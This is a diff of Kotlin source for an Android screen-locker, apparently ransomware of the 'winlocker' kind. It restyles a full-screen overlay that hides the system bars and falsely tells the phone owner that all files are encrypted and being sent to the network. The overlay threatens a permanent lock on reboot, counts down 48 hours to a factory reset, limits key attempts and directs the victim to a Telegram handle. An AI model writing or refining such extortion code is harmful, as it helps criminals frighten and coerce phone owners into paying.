@@ -54,103 +54,121 @@ class LockOverlay(private val context: Context) {
     fun show() {
         if (view != null) return
         
+        // 1. Главный фон (Ярко-красный)
         val root = LinearLayout(context).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
-            setBackgroundColor(Color.parseColor("#CC0000"))
+            setBackgroundColor(Color.parseColor("#CC0000")) // Красный фон
+            setPadding(30, 30, 30, 30)
+        }
+
+        // 2. Центральный прямоугольник (Темно-серый, как в ПК-винлокерах)
+        val box = LinearLayout(context).apply {
+            orientation = LinearLayout.VERTICAL
+            gravity = Gravity.CENTER
             setPadding(40, 40, 40, 40)
+            
+            // Рисуем рамку и темный фон для плашки
+            val bg = GradientDrawable().apply {
+                setColor(Color.parseColor("#1A1A1A")) // Почти черный
+                setStroke(4, Color.WHITE) // Белая рамка
+                cornerRadius = 10f // Слегка скругленные углы
+            }
+            background = bg
         }
 
-        val skullIcon = TextView(context).apply {
-            text = "☠"
-            setTextColor(Color.BLACK)
-            textSize = 120f
-            gravity = Gravity.CENTER
-        }
-
-        val warn1 = TextView(context).apply {
-            text = "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ И ОТПРАВЛЯЮТСЯ В СЕТЬ..."
-            setTextColor(Color.BLACK)
-            textSize = 20f
-            gravity = Gravity.CENTER
-        }
-
-        val warn2 = TextView(context).apply {
-            text = "НЕ ПЕРЕЗАГРУЖАЙТЕ ТЕЛЕФОН!\nПРИ ПОПЫТКЕ ПЕРЕЗАГРУЗКИ ОН БУДЕТ ЗАБЛОКИРОВАН НАВСЕГДА."
-            setTextColor(Color.BLACK)
-            textSize = 14f
-            gravity = Gravity.CENTER
-            setPadding(0, 10, 0, 10)
-        }
-
-        val warn3 = TextView(context).apply {
-            text = "ЕСЛИ НЕ ВВЕСТИ КОД, ТЕЛЕФОН СБРОСИТСЯ ДО ЗАВОДСКИХ НАСТРОЕК, И ВСЕ ДАННЫЕ БУДУТ СТЕРТЫ."
-            setTextColor(Color.BLACK)
-            textSize = 15f
+        // Заголовок
+        val title = TextView(context).apply {
+            text = "!!! СИСТЕМА ЗАБЛОКИРОВАНА !!!"
+            setTextColor(Color.RED)
+            textSize = 22f
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, 15)
         }
 
-        val timerTitle = TextView(context).apply {
-            text = "ОСТАЛОСЬ ВРЕМЕНИ:"
-            setTextColor(Color.BLACK)
+        // Предупреждение 1
+        val warn1 = TextView(context).apply {
+            text = "Все ваши файлы зашифрованы и отправляются в сеть."
+            setTextColor(Color.WHITE)
             textSize = 16f
+            gravity = Gravity.CENTER
+            setPadding(0, 0, 0, 10)
+        }
+
+        // Предупреждение 2
+        val warn2 = TextView(context).apply {
+            text = "НЕ ПЕРЕЗАГРУЖАЙТЕ ТЕЛЕФОН!\nПри попытке перезагрузки он будет заблокирован навсегда."
+            setTextColor(Color.parseColor("#FFAAAA"))
+            textSize = 14f
+            gravity = Gravity.CENTER
+            setPadding(0, 0, 0, 20)
+        }
+
+        // Таймер
+        val timerTitle = TextView(context).apply {
+            text = "ДО СБРОСА ДО ЗАВОДСКИХ НАСТРОЕК:"
+            setTextColor(Color.LTGRAY)
+            textSize = 14f
             gravity = Gravity.CENTER
         }
 
         timerText = TextView(context).apply {
             text = "48:00:00"
-            setTextColor(Color.BLACK)
-            textSize = 40f
+            setTextColor(Color.YELLOW)
+            textSize = 36f
             gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 15)
+            setPadding(0, 5, 0, 20)
         }
 
+        // Попытки
         val attemptsTitle = TextView(context).apply {
             text = "ПОПЫТОК ВВОДА:"
-            setTextColor(Color.BLACK)
-            textSize = 16f
+            setTextColor(Color.LTGRAY)
+            textSize = 14f
             gravity = Gravity.CENTER
         }
 
         attemptsText = TextView(context).apply {
             text = "10"
-            setTextColor(Color.BLACK)
-            textSize = 24f
+            setTextColor(Color.WHITE)
+            textSize = 22f
             gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 15)
+            setPadding(0, 5, 0, 20)
         }
 
+        // Поле ввода
         input = EditText(context).apply {
-            hint = "ВВЕДИТЕ КОД"
-            setTextColor(Color.BLACK)
-            setHintTextColor(Color.parseColor("#880000"))
+            hint = "ВВЕДИТЕ КЛЮЧ"
+            setTextColor(Color.WHITE)
+            setHintTextColor(Color.GRAY)
             gravity = Gravity.CENTER
             textSize = 18f
             inputType = android.text.InputType.TYPE_CLASS_TEXT or
                     android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
             
             val bg = GradientDrawable().apply {
-                setColor(Color.TRANSPARENT)
-                setStroke(4, Color.BLACK)
-                cornerRadius = 10f
+                setColor(Color.parseColor("#333333"))
+                setStroke(2, Color.GRAY)
+                cornerRadius = 5f
             }
             background = bg
             setPadding(20, 20, 20, 20)
         }
 
+        // Кнопка
         btn = Button(context).apply {
             text = "ПРОВЕРИТЬ"
             setTextColor(Color.WHITE)
-            setBackgroundColor(Color.BLACK)
+            setBackgroundColor(Color.parseColor("#880000"))
             setPadding(20, 20, 20, 20)
             setOnClickListener { checkPassword() }
         }
 
+        // Кнопки Telegram и VPN (внутри плашки, внизу)
         val tgBtn = Button(context).apply {
-            text = "Написать в Telegram: @qwerty112005"
+            text = "Связаться: TG @qwerty112005"
             setBackgroundColor(Color.TRANSPARENT)
-            setTextColor(Color.BLACK)
+            setTextColor(Color.parseColor("#33AAFF"))
             setOnClickListener {
                 if (!AppLauncher.openTelegram(context))
                     attemptsText?.text = "TG не найден"
@@ -160,25 +178,28 @@ class LockOverlay(private val context: Context) {
         val vpnBtn = Button(context).apply {
             text = "Включить VPN"
             setBackgroundColor(Color.TRANSPARENT)
-            setTextColor(Color.BLACK)
+            setTextColor(Color.parseColor("#33AAFF"))
             setOnClickListener {
                 if (!AppLauncher.openVpn(context))
                     attemptsText?.text = "VPN не найден"
             }
         }
 
-        root.addView(skullIcon)
-        root.addView(warn1)
-        root.addView(warn2)
-        root.addView(warn3)
-        root.addView(timerTitle)
-        root.addView(timerText)
-        root.addView(attemptsTitle)
-        root.addView(attemptsText)
-        root.addView(input)
-        root.addView(btn)
-        root.addView(tgBtn)
-        root.addView(vpnBtn)
+        // Собираем плашку
+        box.addView(title)
+        box.addView(warn1)
+        box.addView(warn2)
+        box.addView(timerTitle)
+        box.addView(timerText)
+        box.addView(attemptsTitle)
+        box.addView(attemptsText)
+        box.addView(input)
+        box.addView(btn)
+        box.addView(tgBtn)
+        box.addView(vpnBtn)
+
+        // Добавляем плашку на главный экран
+        root.addView(box)
 
         val params = WindowManager.LayoutParams(
             WindowManager.LayoutParams.MATCH_PARENT,
@@ -194,6 +215,7 @@ class LockOverlay(private val context: Context) {
         wm.addView(root, params)
         view = root
 
+        // Скрываем системные панели
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
             root.windowInsetsController?.hide(android.view.WindowInsets.Type.systemBars())
             root.windowInsetsController?.systemBarsBehavior = android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
@@ -208,7 +230,7 @@ class LockOverlay(private val context: Context) {
         }
 
         music.start()
-        voice.speak() // Запуск голоса
+        voice.speak() 
         handler.postDelayed(tick, 1000)
     }
 
